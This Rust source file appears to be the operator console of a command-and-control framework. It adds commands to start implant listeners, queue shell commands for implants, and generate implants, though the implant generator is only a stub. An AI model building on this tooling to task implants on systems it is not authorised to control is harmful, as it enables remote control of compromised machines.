use clap::Parser;
use std::collections::HashMap;

use super::{Server, net::implant_server};
use crate::share::{Console, Commands, Error, parsers};

impl Server {
    pub fn new() -> Server {
        Server { listeners: HashMap::new() }
    }
}

// General purpose commands for the server
impl Commands for Server {
    // TODO: Generate implants
    fn generate(&self, parser: parsers::Generate) -> Result<(), Error> {
        println!("{:?}", parser);
        Ok(())
    }

    fn listeners(&mut self, parser: parsers::Listeners) -> Result<(), Error> {
       match &parser.command {
            // Create a new listener
            parsers::ListenersCommands::New { lhost, lport } => {
                let ip = lhost.parse()
                    .map_err(|_| Error::InvalidIP(lhost.to_string()))?;
                let addr = std::net::SocketAddr::new(ip, *lport);
                let listener = implant_server::Listener::new(addr);
                match listener.start_listener() {
                    Ok(_) => println!("Started listener at {}:{}", lhost, lport),
                    Err(err) => eprintln!("Error, could not start listener on {}:{}\n{:?}", lhost, lport, err)
                }
                self.listeners.insert(format!("{}:{}", lhost, lport), listener);
            },

            // List listeners
            parsers::ListenersCommands::List => {
                for (key, _) in &self.listeners {
                    println!("{}", key);
                }
            }
        }
        Ok(()) 
    }

    fn task(&mut self, parser: parsers::Task) -> Result<(), Error> {
        let listener = self.listeners.get_mut(&parser.listener)
            .ok_or_else(|| Error::ListenerNotExist(parser.listener.clone()))?;

        let mut task = listener.tasks.lock()
            .map_err(|_| {
                let name = format!("listener {}", parser.listener.clone());
                Error::LockMutex(name)
            })?;

        println!("Added `{}` to tasks", parser.cmd);
        task.insert(0, parser.cmd);
        Ok(())
    }
}

// Add commands to the console
pub fn add_commands(console: &mut Console<Server>) {
    console.commands.insert(
        "generate".to_string(),
        |meltout, line| {
            let parser = parsers::Generate::try_parse_from(line)
                .map_err(|e| Error::CommandParsingErr(e))?;
            meltout.generate(parser)?;
            Ok(())
        }
    );
    console.commands.insert(
        "listeners".to_string(),
        |meltout, line| {
            let parser = parsers::Listeners::try_parse_from(line)
                .map_err(|e| Error::CommandParsingErr(e))?;
            meltout.listeners(parser)?;
            Ok(())
        }
    );
    console.commands.insert(
        "task".to_string(),
        |meltout, line| {
            let parser = parsers::Task::try_parse_from(line)
                .map_err(|e| Error::CommandParsingErr(e))?;
            meltout.task(parser)?;
            Ok(())
        }
    );
}